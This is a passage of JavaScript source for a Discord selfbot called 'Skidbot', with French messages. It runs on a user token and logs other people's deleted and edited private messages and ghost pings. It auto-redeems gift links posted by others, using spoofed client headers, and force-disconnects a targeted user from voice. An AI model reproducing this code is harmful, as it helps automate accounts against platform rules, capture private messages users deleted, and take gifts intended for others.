                            let deletedsuc = new Discord.RichEmbed()
                                .setTitle(`${green}  Voila!`)
                                .setDescription(`Deleted all your backups.`)
                                .setFooter('Skidbot 1.0')
                                .setColor(color);
                            message.edit(deletedsuc).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                            msg.delete();
                            console.log('Commande purge backup executé'.yellow)
                        });
                });
        }
        if (message.content === prefix + 'backup friend') {
            var friendCount = client.user.friends.size
            const friends = client.user.friends.array()
            let haste = `Successfully backed up ${friends.length.toString().bold} friends.`.green
            console.log(haste)
            hastebins(`${friends}\n`).then(r => {
                    var embed = new Discord.RichEmbed()
                        .setTitle("backup friends (<@id>)")
                        .addField('```lien hastebins```', r)
                        .setColor(color)
                        .setTimestamp()
                        .setDescription("***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...***")
                    message.edit(embed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    console.log('Commande friends backup executé'.yellow)
                }

            )
        }

        function makeid(length) {
            var result = "";
            var characters =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        function save() {
            fs.writeFile("./Data/backups.json", JSON.stringify(backups), err => {
                if (err) console.error(err);
            });
        }
    } catch (error) {
        return;
    }
})

function saving() {
    fs.writeFile("./Data/afk.json", JSON.stringify(afk), err => {
        if (err) console.error(err);
    });
}

function liste() {
    fs.writeFile("./Data/liste.json", JSON.stringify(lbackup), err => {
        if (err) console.error(err);
    });
}

function kicker() {
    fs.writeFile("./Data/vkick.json", JSON.stringify(kicked), err => {
        if (err) console.error(err);
    });
}
client.on('messageUpdate', (message) => {
    if (message.author.id === client.user.id) {
        return
    };
    if (message.channel.type === 'dm') {
        console.log('╔═════════════════════════════════╗' ['blue']);
        console.log('Log:' ['red']) ^ console.log('╟─────────────────────────────────╢' ['blue']);
        console.log(`${'║--> message mp modifié \n║--> User: '}${message.author.tag}${'\n║--> Content: '}${message.content}${'\n║--> At: '}${message.createdAt}${''}` ['green']);
        console.log('╚═════════════════════════════════╝' ['blue'])
    }
});
client.on("messageUpdate", message => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === "dm") {
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────╢'.blue)
        console.log(`║--> message mp modifié \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    }
})
client.on("messageDelete", message => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === "dm") {
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────'.blue)
        console.log(`║--> 1 message mp surppimé \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    }
    if (message.content.includes('@everyone') || message.content.includes('@here')) {
        if (message.author.id === client.user.id) return;
        if (message.channel.type === "dm") return;
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────'.blue)
        console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    } else return
})



function matchCode(text, callback) {
    let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
    if (codes) {
        callback(codes[0])
        return matchCode(text.slice(codes.index + codes[0].length), callback)
    } else {
        callback(null)
    }
}

client.on("message", message => {
    let codes = []
    matchCode(message.content, (code) => {
        if (!code) return
        if (!codes.includes(code)) codes.push(code)
    })
    if (codes.length == 0) return
    codes.forEach(code => {
        fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
            method: "post",
            headers: {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US",
                "Authorization": client.token,
                "Connection": "keep-alive",
                "Content-Length": JSON.stringify({
                    channel_id: message.channel.id
                }).length,
                "Content-Type": "application/json",
                "Host": "canary.discordapp.com",
                "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                "X-super-properties": Buffer.from(JSON.stringify({
                    "os": "Windows",
                    "browser": "Firefox",
                    "device": "",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "browser_version": "66.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "canary",
                    "client_build_number": 37519,
                    "client_event_source": null
                }), "utf-8").toString("base64")
            },
            body: JSON.stringify({
                channel_id: message.channel.id
            })
        }).then(res => {
            if (res.status == 400 || res.status == 404) return console.log(`code invalide :  ${code}`.red)
            res.json().then(json => {
                console.log(json)
                console.log("Un nouveau nitro à sûrement été ajouté à tes crédits.".green)
            })
        }).catch(console.error)
    })
})

client.on('guildDelete', guild => {
    console.log('\n╔═════════════════════════════════╗'.blue)
    console.log('Log:'.red) ^
        console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> Vous avez quitté le serveur ${guild.name}`.green)
    console.log('╚═════════════════════════════════╝'.blue)
})

client.on('guildCreate', guild => {
    console.log('\n╔═════════════════════════════════╗'.blue)
    console.log('Log:'.red) ^
        console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> Vous avez rejoint le serveur ${guild.name}`.green)
    console.log('╚═════════════════════════════════╝'.blue)
})


client.on("voiceStateUpdate", (oldMember) => {
    if (!oldMember) return;
    let oldVCID = oldMember.voiceChannelID;
    if (oldVCID) return;

    let oldChannelName =
        oldVCID != null && typeof oldVCID != undefined ?
        client.channels.get(oldVCID).name :
        null;
    if (oldChannelName === null) {
        if (kicked[oldMember.guild.id]) {
            if (oldMember.user.id === kicked[oldMember.guild.id].user) {
                if (!oldMember.guild.me.hasPermission('MOVE_MEMBERS')) return console.log("Erreur manque de permission.");
                oldMember.setVoiceChannel(null);
            }
        }
    } else
        return
});


client.login(token).catch(err => {
    if (err.toString().includes('Incorrect login details were provided'.red) || err.toString().includes('An invalid token was provided'.red)) {
        console.log('Token invalid!\nChange ton token dans le config.json'.red)
    }
})